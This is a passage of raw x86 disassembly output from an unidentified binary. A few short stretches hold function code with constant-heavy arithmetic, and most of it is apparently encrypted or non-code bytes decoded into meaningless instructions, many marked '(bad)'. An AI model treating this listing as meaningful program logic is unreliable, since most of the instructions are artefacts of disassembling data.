  41496a:	mov    ecx,DWORD PTR [ebp-0xc]
  41496d:	or     eax,ecx
  41496f:	mov    ecx,DWORD PTR [ebp+0x8]
  414972:	mov    ecx,DWORD PTR [edx+ecx*1+0x1c323f3c]
  414979:	add    eax,0x40e5
  41497e:	imul   eax,eax,0x214c
  414984:	jmp    0x414d49
  414989:	retf   0x46a0
  41498c:	mov    ds:0xa02a1a22,al
  414991:	pop    es
  414992:	inc    ecx
  414993:	repnz push 0xffffff84
  414996:	jae    0x4149d1
  414998:	push   0xffffff8b
  41499a:	sbb    al,0x18
  41499c:	sbb    al,dl
  41499e:	adc    bl,BYTE PTR [eax]
  4149a0:	sbb    BYTE PTR [edi],cl
  4149a2:	jbe    0x41492e
  4149a4:	mov    BYTE PTR es:0x9cfe77d2,0xa9
  4149ac:	and    al,dh
  4149ae:	test   BYTE PTR [ebx-0x56],cl
  4149b1:	pop    ebp
  4149b2:	push   0x1e
  4149b4:	movzx  ebp,cx
  4149b7:	neg    edi
  4149b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149ba:	mov    ds:0x52e3960e,eax
  4149bf:	(bad)  
  4149c0:	dec    ecx
  4149c1:	jo     0x41494a
  4149c3:	add    DWORD PTR [ebx+0x5e768989],ebp
  4149c9:	in     al,dx
  4149ca:	leave  
  4149cb:	jl     0x414a37
  4149cd:	test   al,0x2d
  4149cf:	mov    esi,0x7c0b7596
  4149d4:	mov    DWORD PTR [edi+0x5031a1b6],esi
  4149da:	cmp    dl,BYTE PTR [ebp-0x3f]
  4149dd:	jle    0x414987
  4149df:	arpl   WORD PTR [ebx],bx
  4149e1:	push   edi
  4149e2:	sti    
  4149e3:	and    eax,DWORD PTR [esi+ebp*8]
  4149e6:	xor    ch,al
  4149e8:	int3   
  4149e9:	xor    ebx,DWORD PTR [edx-0x75]
  4149ec:	js     0x414a0e
  4149ee:	jg     0x4149d6
  4149f0:	cdq    
  4149f1:	push   edi
  4149f2:	mov    WORD PTR [edi-0x4d],ss
  4149f5:	mov    WORD PTR ds:0x92879b64,ss
  4149fb:	(bad)  
  4149fc:	shl    BYTE PTR [esi],cl
  4149fe:	pop    ds
  4149ff:	add    DWORD PTR [edx-0x46],edi
  414a02:	out    0x7,eax
  414a04:	or     DWORD PTR [edi-0x7ca5eb4c],esi
  414a0a:	mov    dh,0x9f
  414a0c:	pop    edi
  414a0d:	inc    esp
  414a0e:	iret   
  414a0f:	repz (bad) 
  414a12:	mov    WORD PTR [eax],ss
  414a14:	stc    
  414a15:	inc    esp
  414a16:	pop    ebx
  414a17:	fdivr  st,st(7)
  414a19:	(bad)  
  414a1a:	fdiv   DWORD PTR [ebp+0x42]
  414a1d:	nop
  414a1e:	mov    eax,ds:0x56dfb594
  414a23:	scas   al,BYTE PTR es:[edi]
  414a24:	out    dx,al
  414a25:	xchg   edi,eax
  414a26:	mov    esi,0x15e53ec
  414a2b:	(bad)  
  414a2c:	enter  0xa0b7,0x97
  414a30:	retf   0xd93e
  414a33:	test   edx,esi
  414a35:	lods   eax,DWORD PTR ds:[esi]
  414a36:	pusha  
  414a37:	push   es
  414a38:	push   0x5cf28f22
  414a3d:	pop    ecx
  414a3e:	sbb    al,ch
  414a40:	jae    0x4149f8
  414a42:	jne    0x414a76
  414a44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a45:	hlt    
  414a46:	mov    BYTE PTR [edx+edi*1],dh
  414a49:	cld    
  414a4a:	popa   
  414a4b:	outs   dx,DWORD PTR ds:[esi]
  414a4c:	cdq    
  414a4d:	jg     0x414a2d
  414a4f:	sub    ebp,DWORD PTR [edx]
  414a51:	sbb    ch,ah
  414a53:	xor    dl,BYTE PTR [ecx]
  414a55:	and    eax,0x2639305d
  414a5a:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a5c:	pop    ebx
  414a5d:	jb     0x414a26
  414a5f:	xor    al,0xa9
  414a61:	int3   
  414a62:	pusha  
  414a63:	test   edx,ecx
  414a65:	out    0x4c,eax
  414a67:	cli    
  414a68:	jp     0x414a64
  414a6a:	es adc al,0xaa
  414a6d:	fstp   DWORD PTR [ebp+0x46]
  414a70:	sbb    BYTE PTR [ebp-0x3c],0xf5
  414a74:	fdiv   DWORD PTR [edx]
  414a76:	stos   BYTE PTR es:[edi],al
  414a77:	(bad)  
  414a78:	loop   0x414aae
  414a7a:	sub    BYTE PTR [ecx+0x38930e98],dl
  414a80:	scas   eax,DWORD PTR es:[edi]
  414a81:	pop    ebx
  414a82:	popa   
  414a83:	popf   
  414a84:	push   ds
  414a85:	mov    esp,0xf2826dfc
  414a8a:	push   esi
  414a8b:	push   ss
  414a8c:	clc    
  414a8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a8e:	fsubp  st(2),st
  414a90:	outs   dx,DWORD PTR ds:[esi]
  414a91:	fwait
  414a92:	add    bh,BYTE PTR [ebx-0x1]
  414a95:	dec    edi
  414a96:	pushf  
  414a97:	xchg   BYTE PTR [edi+0x56],bh
  414a9a:	cmp    eax,0xa9f3a3bc
  414a9f:	stos   DWORD PTR es:[edi],eax
  414aa0:	push   edi
  414aa1:	leave  
  414aa2:	pop    esp
  414aa3:	sahf   
  414aa4:	cwde   
  414aa5:	outs   dx,BYTE PTR ds:[esi]
  414aa6:	push   ds
  414aa7:	loopne 0x414b17
  414aa9:	in     eax,dx
  414aaa:	jnp    0x414a32
  414aac:	loopne 0x414a87
  414aae:	xor    eax,0x4635c414
  414ab3:	pop    ebp
  414ab4:	jle    0x414b06
  414ab6:	ss (bad) 
  414ab8:	lock jb 0x414b00
  414abb:	rcl    BYTE PTR [esi],0xd7
  414abe:	aam    0xdc
  414ac0:	xchg   ebp,eax
  414ac1:	mov    eax,ds:0x6af67714
  414ac6:	ja     0x414a61
  414ac8:	lahf   
  414ac9:	dec    ecx
  414aca:	pop    ss
  414acb:	stc    
  414acc:	cmp    eax,0x5805153d
  414ad1:	push   esi
  414ad2:	inc    ebx
  414ad3:	and    al,0x94
  414ad5:	push   0xffffffe8
  414ad7:	out    0x63,eax
  414ad9:	int3   
  414ada:	imul   esi,eax,0x71
  414add:	pop    esp
  414ade:	xchg   ebp,eax
  414adf:	pop    ebx
  414ae0:	mov    edi,0x3f6d1b02
  414ae5:	dec    esp
  414ae6:	xchg   esp,eax
  414ae7:	js     0x414a9f
  414ae9:	data16 adc al,0x70
  414aec:	out    0x8c,eax
  414aee:	ins    DWORD PTR es:[edi],dx
  414aef:	and    ah,ch
  414af1:	sub    edi,DWORD PTR [ebp+0x51]
  414af4:	pusha  
  414af5:	xor    cl,BYTE PTR gs:[eax-0x6a]
  414af9:	cmp    dh,bh
  414afb:	sahf   
  414afc:	xchg   ebx,eax
  414afd:	pop    ebx
  414afe:	test   DWORD PTR [edi],0x1ef2c85e
  414b04:	and    BYTE PTR [ebx-0x6],dh
  414b07:	sbb    esi,DWORD PTR [ebx+0x7041674]
  414b0d:	pop    eax
  414b0e:	test   bl,dh
  414b10:	push   esp
  414b11:	mov    bh,0xd
  414b13:	cmp    bh,BYTE PTR [ecx]
  414b15:	aad    0xee
  414b17:	pushf  
  414b18:	ss ins DWORD PTR es:[edi],dx
  414b1a:	cmp    BYTE PTR [edx],dh
  414b1c:	sbb    dh,BYTE PTR [edi]
  414b1e:	pop    esp
  414b1f:	scas   al,BYTE PTR es:[edi]
  414b20:	shr    BYTE PTR [edx-0x1dfd8f1c],0x4
  414b27:	mov    al,0x6d
  414b29:	fild   DWORD PTR [edx+0x6d]
  414b2c:	cmp    ch,BYTE PTR [eax]
  414b2e:	pop    ebp
  414b2f:	jnp    0x414b24
  414b31:	(bad)  
  414b33:	inc    ebx
  414b34:	xchg   esi,eax
  414b35:	stos   BYTE PTR es:[edi],al
  414b36:	gs jecxz 0x414b20
  414b39:	push   cs
  414b3a:	jg     0x414acc
  414b3c:	ds sbb eax,0x1102e821
  414b42:	and    BYTE PTR [edi+0x2b5e13a8],ch
  414b48:	cmp    ebx,DWORD PTR [esi]
  414b4a:	gs ss push eax
  414b4d:	xchg   ebp,eax
  414b4e:	(bad)
  414b51:	jmp    0x93f16850
  414b56:	addr16 out 0xe7,eax
  414b59:	adc    eax,ebx
  414b5b:	jb     0x414b92
  414b5d:	dec    eax
  414b5e:	les    ebx,FWORD PTR [esi-0x13f4afef]
  414b64:	sar    DWORD PTR [edi+0x60c0a7c4],0xe6
  414b6b:	out    0x61,eax
  414b6d:	or     eax,0xc47bb391
  414b72:	xchg   DWORD PTR [esi+0x286605ad],edi
  414b78:	sub    eax,0x203f07df
  414b7d:	push   esi
  414b7e:	mov    edx,0x5024732a
  414b83:	mov    bh,0x6
  414b85:	add    al,0xbd
  414b87:	popa   
  414b88:	add    al,BYTE PTR [eax-0xca7430]
  414b8e:	and    BYTE PTR [ebx+0x66],al
  414b91:	je     0x414b8f
  414b93:	ins    BYTE PTR es:[edi],dx
  414b94:	and    BYTE PTR [ecx],cl
  414b96:	ja     0x414b50
  414b98:	add    eax,0x56dc265c
  414b9d:	lods   eax,DWORD PTR ds:[esi]
  414b9e:	fdiv   QWORD PTR [edx-0x3566f7e2]
  414ba4:	cmp    DWORD PTR [ecx+0x2f],edx
  414ba7:	pusha  
  414ba8:	fldcw  WORD PTR [ebx+0x66589cc]
  414bae:	daa    
  414baf:	ins    DWORD PTR es:[edi],dx
  414bb0:	pop    eax
  414bb1:	xchg   edi,eax
  414bb2:	adc    DWORD PTR [edi],ecx
  414bb4:	push   ecx
  414bb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bb6:	arpl   WORD PTR [ecx-0x58],ax
  414bb9:	add    BYTE PTR [ecx-0xac16810],cl
  414bbf:	adc    edx,DWORD PTR [edi]
  414bc1:	fdivr  DWORD PTR [esi+esi*2-0x216225f]
  414bc8:	mov    ebx,ebx
  414bca:	mov    ebx,0xffb9ac40
  414bcf:	pop    edi
  414bd0:	mov    al,cl
  414bd2:	int    0xe
  414bd4:	imul   eax,DWORD PTR [ebx],0xffffffcf
  414bd7:	push   esi
  414bd8:	mov    ebp,0xb87f2c08
  414bdd:	jo     0x414c54
  414bdf:	add    BYTE PTR [esi-0x61],ch
  414be2:	or     BYTE PTR [esi],cl
  414be4:	fwait
  414be5:	pop    edx
  414be6:	xor    bl,al
  414be8:	call   0xb6c5:0xa0c5bcdf
  414bef:	aaa    
  414bf0:	sti    
  414bf1:	xchg   esp,eax
  414bf2:	pop    ebx
  414bf3:	pop    esi
  414bf4:	mov    al,ds:0x27192e48
  414bf9:	inc    eax
  414bfa:	push   cs
  414bfb:	pusha  
  414bfc:	aad    0x8b
  414bfe:	inc    esp
  414bff:	xchg   ecx,eax
  414c00:	or     eax,0xb4da22c5
  414c05:	leave  
  414c06:	mov    bl,0x9a
  414c08:	(bad)
  414c0c:	loope  0x414b9a
  414c0e:	sbb    BYTE PTR [ebp+0x229da1af],0xb5
  414c15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c16:	scas   eax,DWORD PTR es:[edi]
  414c17:	xor    ch,BYTE PTR [esi-0x1390ddc7]
  414c1d:	das    
  414c1e:	mov    ah,0x68
  414c20:	test   BYTE PTR [bx+si],0xec
  414c24:	repz mov eax,0x3cef638f
  414c2a:	jl     0x414c40
  414c2c:	jae    0x414c0d
  414c2e:	or     bh,BYTE PTR [edi]
  414c30:	and    cl,BYTE PTR [ebp+0x7c8f6d5a]
  414c36:	fidivr DWORD PTR [ecx-0x7dd95a59]
  414c3c:	jecxz  0x414c1d
  414c3e:	cmp    BYTE PTR ds:0x20a1996,bl
  414c44:	adc    ch,al
  414c46:	out    0x6a,eax
  414c48:	lea    esi,[edi+0xb677609]
  414c4e:	dec    ebx
  414c4f:	and    esp,DWORD PTR [eax-0x51f6e5f]
  414c55:	imul   DWORD PTR [ebx+eax*2]
  414c58:	pop    esp
  414c59:	pop    ebx
  414c5a:	inc    ecx
  414c5b:	xor    ebx,esp
  414c5d:	xor    eax,0xa60b6c9c
  414c62:	pop    ebp
  414c63:	xchg   edx,eax
  414c64:	add    eax,0x9059451e
  414c69:	push   0x2f587dde
  414c6e:	cmp    al,0xf3
  414c70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c71:	mov    edx,ss
  414c73:	xor    al,0x7c
  414c75:	and    bl,dh
  414c77:	jp     0x414c68
  414c79:	repz adc BYTE PTR ss:[ebx-0x2b],al
  414c7e:	mov    eax,0xeb3779ad
  414c83:	pop    eax
  414c84:	ja     0x414cfa
  414c86:	add    eax,0xb0d3e79a
  414c8b:	sbb    ebx,DWORD PTR [edx+0x3624450e]
  414c91:	cmp    dh,BYTE PTR [edi+0x15]
  414c94:	mov    bl,0x37
  414c96:	lea    edx,[edi+0xe]
  414c99:	ror    DWORD PTR [eax-0x60],cl
  414c9c:	pop    es
  414c9d:	repnz mov al,ds:0x4785b789
  414ca3:	mov    eax,0xe5d61ab1
  414ca8:	cmc    
  414ca9:	imul   ebp,DWORD PTR [ecx-0x5b13777a],0x66
  414cb0:	pop    es
  414cb1:	cwde   
  414cb2:	mov    ss,WORD PTR cs:[edx+0xe]
  414cb6:	lods   eax,DWORD PTR ds:[esi]
  414cb7:	imul   BYTE PTR [edi-0x3fb910b6]
  414cbd:	out    0x52,eax
  414cbf:	dec    esp
  414cc0:	xor    al,0x2d
  414cc2:	retf   
  414cc3:	mov    bh,0x2b
  414cc5:	pop    edi
  414cc6:	jp     0x414d14
  414cc8:	out    dx,al
  414cc9:	into   
  414cca:	jo     0x414c67
  414ccc:	adc    dh,BYTE PTR [esi]
  414cce:	daa    
  414ccf:	pop    edi
  414cd0:	jnp    0x414cb5
  414cd2:	mov    cs,eax
  414cd4:	or     al,0xc8
  414cd6:	call   0x5549f644
  414cdb:	cwde   
  414cdc:	hlt    
  414cdd:	jbe    0x414d36
  414cdf:	(bad)  
  414ce0:	je     0x414c84
  414ce2:	fbstp  TBYTE PTR [ebx-0x6]
  414ce5:	jb     0x414ce6
  414ce7:	pop    ss
  414ce8:	dec    ecx
  414ce9:	cmp    BYTE PTR [edx+0x72],cl
  414cec:	inc    ebx
  414ced:	lock xor eax,0xccdd61d6
  414cf3:	sti    
  414cf4:	inc    ecx
  414cf5:	gs and eax,0x87a4ae5b
  414cfb:	(bad)  
  414cfc:	cli    
  414cfd:	sub    cl,BYTE PTR [esi-0x76]
  414d00:	cmp    DWORD PTR [edx-0x43],ebx
  414d03:	add    eax,0xc3ab074b
  414d08:	push   esi
  414d09:	xor    ebx,0xffffffea
  414d0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d0d:	jmp    0x1809f2be
  414d12:	jl     0x414d4f
  414d14:	lea    ecx,[edi-0x57]
  414d17:	test   DWORD PTR [eax],esi
  414d19:	dec    ebp
  414d1a:	mov    al,0xc2
  414d1c:	out    dx,al
  414d1d:	cmp    edi,DWORD PTR [esi+0x77]
  414d20:	mov    ecx,0x674412fa
  414d25:	rol    DWORD PTR [ecx],cl
  414d27:	push   ss
  414d28:	sbb    esi,DWORD PTR [ebx]
  414d2a:	fisub  DWORD PTR [edi-0x75]
  414d2d:	inc    eax
  414d2e:	imul   ecx,DWORD PTR [edx-0x25],0xe52908f
  414d35:	(bad)  
  414d37:	cmc    
  414d38:	mov    ebx,esp
  414d3a:	mov    ecx,esp
  414d3c:	push   ebp
  414d3d:	fdivp  st(0),st
  414d3f:	cmp    BYTE PTR [ecx-0x6a392ed0],dl
  414d45:	ret    0x539d
  414d48:	dec    ebp
  414d49:	add    eax,ecx
  414d4b:	mov    ecx,DWORD PTR [ebp+0x8]
  414d4e:	add    ecx,eax
  414d50:	mov    DWORD PTR [ebp+0x8],ecx
  414d53:	mov    eax,DWORD PTR [ebp-0x24]
  414d56:	mov    ecx,DWORD PTR [ebp-0x28]
  414d59:	and    eax,ecx
  414d5b:	mov    ecx,DWORD PTR [ebp-0x2c]
  414d5e:	and    eax,ecx
  414d60:	mov    ecx,DWORD PTR [ebp-0x30]
  414d63:	imul   eax,ecx
  414d66:	mov    ecx,DWORD PTR [ebp-0x34]
  414d69:	or     eax,ecx
  414d6b:	mov    ecx,DWORD PTR [ebp-0x38]
  414d6e:	imul   eax,ecx
  414d71:	mov    ecx,DWORD PTR [ebp+0x8]
  414d74:	sub    eax,0x777ea653
  414d79:	cmp    DWORD PTR [ecx+0x54],eax
  414d7c:	je     0x414d8a
  414d82:	mov    eax,DWORD PTR [ebp+0x8]
  414d85:	jmp    0x414dd1
  414d8a:	mov    eax,DWORD PTR [ebp-0x3c]
  414d8d:	sub    eax,0x5258
  414d92:	xor    eax,0x49e9
  414d97:	add    eax,0x253
  414d9c:	jmp    0x414dd1
  414da1:	mov    DWORD PTR [ebp-0x3c],0x4177
  414da8:	mov    DWORD PTR [ebp+0x8],0x1405
  414daf:	mov    eax,DWORD PTR [ebp+0x8]
  414db2:	mov    ecx,DWORD PTR [ebp-0x3c]
  414db5:	imul   eax,eax,0x58cc
  414dbb:	add    eax,0x3f39
  414dc0:	and    eax,ecx
  414dc2:	add    eax,0x3b90
  414dc7:	or     eax,0x4b1c
  414dcc:	sub    eax,0x7fdd
  414dd1:	leave  
  414dd2:	ret    0x4
  414dd5:	push   ebp
  414dd6:	mov    ebp,esp
  414dd8:	and    esp,0xfffffff8
  414ddb:	sub    esp,0x20
  414dde:	push   ebx
  414ddf:	push   esi
  414de0:	lea    eax,[esp+0x10]
  414de4:	mov    DWORD PTR [esp+0xc],eax
  414de8:	mov    eax,DWORD PTR [esp+0xc]
  414dec:	mov    ecx,DWORD PTR [esp+0x10]
  414df0:	jmp    0x4151d4
  414df5:	sbb    eax,0x1afa8288
  414dfa:	cli    
  414dfb:	sbb    al,0x26
  414dfd:	retf   0xbdbd
  414e00:	mov    al,0x37
  414e02:	pop    ss
  414e03:	jnp    0x414db5
  414e05:	inc    edx
  414e06:	push   ss
  414e07:	push   ss
  414e08:	sbb    BYTE PTR [edx+0x49181812],dl
  414e0e:	loop   0x414db9
  414e10:	das    
  414e11:	stc    
  414e12:	mov    eax,ds:0x204aa50a
  414e17:	les    esp,FWORD PTR [ecx+0x55]
  414e1a:	push   ebp
  414e1b:	sub    DWORD PTR ds:0x2f8073fe,esp
  414e21:	pop    ds
  414e22:	jle    0x414e22
  414e24:	out    0x68,al
  414e26:	or     BYTE PTR [ebp-0x3d],ah
  414e29:	sbb    esp,edi
  414e2b:	mov    ?,ecx
  414e2d:	or     BYTE PTR [edi-0x29],dh
  414e30:	mov    esi,0xde57f3bc
  414e35:	mov    dh,0xe8
  414e37:	gs mov dh,0xa4
  414e3a:	add    esp,edx
  414e3c:	adc    DWORD PTR [esi-0x46],ebx
  414e3f:	and    DWORD PTR [esi-0x43ba6582],0x7008df7a
  414e49:	add    ebx,DWORD PTR [ecx]
  414e4b:	jmp    0xc012:0x36c2422e
  414e52:	rcr    DWORD PTR [edx+0x9],cl
  414e55:	enter  0xa5a1,0x72
  414e59:	imul   esi,DWORD PTR [eax+0x6],0x4c
  414e5d:	(bad)  
  414e5e:	adc    BYTE PTR [esp+edx*1-0x6b9a3b59],bh
  414e65:	xchg   ebp,ebx
  414e67:	aam    0xf8
  414e69:	mov    ecx,0x1aef9a54
  414e6e:	out    0x49,eax
  414e70:	aam    0xa1
  414e72:	jle    0x414e2e
  414e74:	mov    esp,0x264239bd
  414e79:	pop    ss
  414e7a:	shl    BYTE PTR [edi+0x72],cl
  414e7d:	repnz pop ebx
  414e7f:	push   ecx
  414e80:	shl    ecx,0xee
  414e83:	jne    0x414e70
  414e85:	jmp    0x2f87f04d
  414e8a:	out    0x6e,eax
  414e8c:	shl    DWORD PTR [edx],cl
  414e8e:	mov    al,ds:0xd4a5bb41
  414e93:	in     eax,0x1f
  414e95:	and    ebx,DWORD PTR [esi-0x78c0e26d]
  414e9b:	adc    DWORD PTR [esi-0x22],esp
  414e9e:	pop    esp
  414ea0:	xor    BYTE PTR [ebx+0x11],bl
  414ea3:	adc    dh,al
  414ea5:	xor    cl,BYTE PTR [edi]
  414ea7:	xor    al,BYTE PTR [ebp+0x47]
  414eaa:	shl    BYTE PTR [edx+edx*4-0x25d01522],1
  414eb1:	outs   dx,DWORD PTR ds:[esi]
  414eb2:	push   ecx
  414eb3:	push   edi
  414eb4:	or     al,0x94
  414eb6:	xchg   dl,bl
  414eb8:	xchg   edi,eax
  414eb9:	daa    
  414eba:	(bad)  
  414ebb:	xchg   edx,eax
  414ebc:	fcmovb st,st(5)
  414ebe:	push   esi
  414ebf:	mov    dh,0x7e
  414ec1:	xchg   ecx,eax
  414ec2:	jne    0x414eae
  414ec4:	xor    al,0x9e
  414ec6:	push   esp
  414ec7:	sub    eax,ecx
  414ec9:	cmp    eax,0x38f2951
  414ece:	push   cs
  414ecf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ed0:	push   0xffffffd5
  414ed2:	sbb    ebx,0x722bdca6
  414ed8:	ins    BYTE PTR es:[edi],dx
  414ed9:	cli    
  414eda:	je     0x414f51
  414edc:	ss inc eax
  414ede:	xchg   ebp,eax
  414edf:	gs in  al,dx
  414ee1:	retf   
  414ee2:	jbe    0x414f5c
  414ee4:	xchg   ebx,eax
  414ee5:	cli    
  414ee6:	mov    ch,BYTE PTR [edi+0x51]
  414ee9:	retf   0x85ce
  414eec:	xor    ecx,DWORD PTR [ebx-0x1d]
  414eef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ef0:	scas   eax,DWORD PTR es:[edi]
  414ef1:	inc    edx
  414ef2:	imul   esp,DWORD PTR [edx-0x24d3dcf],0xffffffa0
  414ef9:	popa   
  414efa:	dec    edi
  414efb:	sar    BYTE PTR [edi+0x5d],1
  414efe:	aad    0xf5
  414f00:	ret    0xbd5f
  414f03:	jb     0x414eb9
  414f05:	inc    edi
  414f06:	in     al,dx
  414f07:	mov    al,ds:0xd4d49346
  414f0c:	stc    
  414f0d:	lods   al,BYTE PTR ds:[esi]
  414f0e:	notrack jmp DWORD PTR [ebx]
  414f11:	ins    BYTE PTR es:[edi],dx
  414f12:	xchg   esi,eax
  414f13:	mov    ah,0x8c
  414f15:	ss cli 
  414f17:	jp     0x414f74
  414f19:	(bad)  [ebx+0x43]
  414f1c:	in     eax,0xde
  414f1e:	xor    eax,0x1a5ffda9
  414f23:	xor    cl,bh
  414f25:	retf   
  414f26:	cmp    al,0x5b
  414f28:	lahf   
  414f29:	jno    0x414f0b
  414f2b:	ins    DWORD PTR es:[edi],dx
  414f2c:	dec    edx
  414f2d:	cmp    BYTE PTR ds:0x67086cc5,0x2b
  414f34:	xor    ah,BYTE PTR [ebp-0x2b99fc67]
  414f3a:	lahf   
  414f3b:	aas    
  414f3c:	jmp    0x6f3128a
  414f41:	pop    ss
  414f42:	pop    edx
  414f43:	in     eax,0xd8
  414f45:	(bad)  
  414f46:	call   FWORD PTR [edi+0x14d3ab98]
  414f4c:	push   0xfffffff7
  414f4e:	add    dl,BYTE PTR [esi+0x64]
  414f51:	rol    esi,cl
  414f53:	adc    al,0xfb
  414f55:	and    edi,DWORD PTR [edx-0x740b947b]
  414f5b:	pusha  
  414f5c:	dec    esi
  414f5d:	loope  0x414f2e
  414f5f:	test   DWORD PTR [edx],edx
  414f61:	in     al,dx
  414f62:	adc    BYTE PTR [ecx+eiz*1-0x31041f8d],bh
  414f69:	mov    ds:0x95de4470,al
  414f6e:	mov    bl,0xa
  414f70:	adc    bh,BYTE PTR [ebx+0x540b7536]
  414f76:	es add eax,0x10e4d704
  414f7c:	and    al,0x6f
  414f7e:	or     eax,0x9439bc31
  414f83:	test   DWORD PTR [ebx-0x55949119],0x885fd67e
  414f8d:	ja     0x414fb7
  414f8f:	and    al,0x44
  414f91:	and    al,0x37
  414f93:	jmp    0x9801612a
  414f98:	retf   0xe6a1
  414f9b:	popf   
  414f9c:	sbb    DWORD PTR [esi+eiz*8-0x12],edx
  414fa0:	jge    0x414fdf
  414fa2:	leave  
  414fa3:	addr16 repnz mov dh,al
  414fa7:	fdivr  QWORD PTR [eax+0x68121de]
  414fad:	mov    ah,0xf9
  414faf:	sub    DWORD PTR [ecx-0x34],eax
  414fb2:	dec    ebx
  414fb3:	punpckhwd mm1,QWORD PTR [eax+esi*4-0x59]
  414fb8:	adc    al,0xb3
  414fba:	xchg   edx,eax
  414fbb:	jmp    0x3e60:0x2638aae1
  414fc2:	lahf   
  414fc3:	add    dh,BYTE PTR [ecx+0xa]
  414fc6:	pop    ecx
  414fc7:	out    0xd,eax
  414fc9:	mov    dl,0x2f
  414fcb:	test   al,0x9e
  414fcd:	div    BYTE PTR gs:[edx+0xb090d96]
  414fd4:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  414fd6:	adc    esi,ebx
  414fd8:	xchg   ebx,eax
  414fd9:	idiv   DWORD PTR [ebx+0x68]
  414fdc:	inc    esi
  414fdd:	push   cs
  414fde:	sar    BYTE PTR [edx+0x2f5511e0],0xd0
  414fe5:	mov    ebp,0x374eafad
  414fea:	sti    
  414feb:	shr    BYTE PTR [esi+esi*1],1
  414fee:	mov    eax,ds:0x45e1a289
  414ff3:	fsubr  DWORD PTR [ecx-0x35]
  414ff6:	or     al,0xaa
  414ff8:	fist   DWORD PTR [edi+0x7b]
  414ffb:	add    al,0x17
  414ffd:	bound  edi,QWORD PTR [ebp+ebp*2+0x5c]
  415001:	js     0x415012
  415003:	dec    edi
  415004:	js     0x415033
  415006:	or     edi,DWORD PTR [ebx+eiz*2]
  415009:	sub    BYTE PTR [eax],al
  41500b:	das    
  41500c:	adc    eax,0x8f8caa6
  415011:	xor    BYTE PTR [edi+0x6],al
  415014:	jnp    0x41507a
  415016:	lds    esi,FWORD PTR [eax-0x125c1b6]
  41501c:	xchg   BYTE PTR [ebx-0x5a44cc75],dl
  415022:	hlt    
  415023:	call   0x87a0b2e8
  415028:	cmp    al,0xf0
  41502a:	das    
  41502b:	mul    DWORD PTR [esp+ecx*2]
  41502e:	push   ds
  41502f:	repnz scas al,BYTE PTR es:[edi]
  415031:	adc    eax,0x16519ea5
  415036:	sub    BYTE PTR [edi-0x4b],dh
  415039:	or     ebp,DWORD PTR [esi+0x2d55897]
  41503f:	sbb    eax,0x1be832c0
  415044:	mov    al,0x0
  415046:	lods   eax,DWORD PTR ds:[esi]
  415047:	jecxz  0x414ff5
  415049:	dec    ecx
  41504a:	or     eax,0x744b85c7
  41504f:	sar    esi,cl
  415051:	pop    ebp
  415052:	push   edi
  415053:	cld    
  415054:	stos   DWORD PTR es:[edi],eax
  415055:	cwde   
  415056:	xlat   BYTE PTR ds:[ebx]
  415057:	retf   0xe74f
  41505a:	faddp  st(5),st
  41505c:	bound  edx,QWORD PTR [ecx+0x5d]
  41505f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415060:	call   0x97f6:0x7879b08b
  415067:	sbb    DWORD PTR [eax+0x75],0xffffff9f
  41506b:	push   ds
  41506c:	(bad)  
  41506d:	pop    ds
  41506e:	mov    eax,0x4f890787
  415073:	or     ch,bl
  415075:	push   0xf4247add
  41507a:	and    al,0x2e
  41507c:	mov    esp,0xf0b6cbef
  415081:	mov    al,ds:0x1e52e9a0
  415086:	pop    ss
  415087:	not    DWORD PTR [ebx+0x53]
  41508a:	push   es
  41508b:	(bad)  
  41508c:	or     eax,0x6fd7f5e3
  415091:	sbb    bl,BYTE PTR [ebx-0x4c438ebd]
  415097:	enter  0x670c,0x51
  41509b:	imul   BYTE PTR [edx]
  41509d:	sub    eax,ebx
  41509f:	jo     0x4150c4
  4150a1:	pop    eax
  4150a2:	add    ecx,DWORD PTR [di-0x7c]
  4150a6:	test   DWORD PTR [ecx],ebx
  4150a8:	mov    cl,0x89
  4150aa:	jo     0x4150f2
  4150ac:	jne    0x415087
  4150ae:	adc    BYTE PTR [esi+0xa],al
  4150b1:	les    ebp,FWORD PTR [ecx]
  4150b3:	mov    ecx,0xd8b106c3
  4150b8:	jecxz  0x41510d
  4150ba:	pop    ebx
  4150bb:	mov    esp,DWORD PTR ds:0xf550e3d9
  4150c1:	or     eax,0x9b2a67ac
  4150c6:	bound  ebx,QWORD PTR [ecx]
  4150c8:	mov    BYTE PTR [edi],dh
  4150ca:	sub    edi,DWORD PTR [edi]
  4150cc:	pop    edi
  4150cd:	fadd   DWORD PTR [ecx+0x7b]
  4150d0:	lock into 
  4150d2:	lds    ecx,FWORD PTR [ebx+0x2182ab58]
  4150d8:	mov    dh,0x9b
  4150da:	(bad)  
  4150db:	jns    0x4150ea
  4150dd:	cmp    ah,dl
  4150df:	shr    dl,0x87
  4150e2:	or     BYTE PTR [ecx],0x2c
  4150e5:	sub    al,0x9
  4150e7:	adc    al,BYTE PTR [edi]
  4150e9:	hlt    
  4150ea:	scas   eax,DWORD PTR es:[edi]
  4150eb:	icebp  
  4150ec:	and    eax,0x87f186ec
  4150f1:	mov    esp,0x768630e1
  4150f6:	invd   
  4150f8:	sub    esi,DWORD PTR [eax-0x68f82542]
  4150fe:	mov    ebp,0xfb3a5a71
  415103:	test   BYTE PTR [ebx+0x60],0x1f
  415107:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415108:	or     esi,DWORD PTR [esi+0x30]
  41510b:	cli    
  41510c:	stos   BYTE PTR es:[edi],al
  41510d:	and    DWORD PTR gs:[edi-0x1d],esp
  415111:	mov    ah,0xe8
  415113:	ror    BYTE PTR [edx],1
  415115:	mov    eax,ds:0xcc27c3c6
  41511a:	aam    0x69
  41511c:	aaa    
  41511d:	jnp    0x415173
  41511f:	mov    esp,0xb88134f8
  415124:	jle    0x4150d7
  415126:	jbe    0x415126
  415128:	je     0x4150ce
  41512a:	add    eax,0x7aaa7056
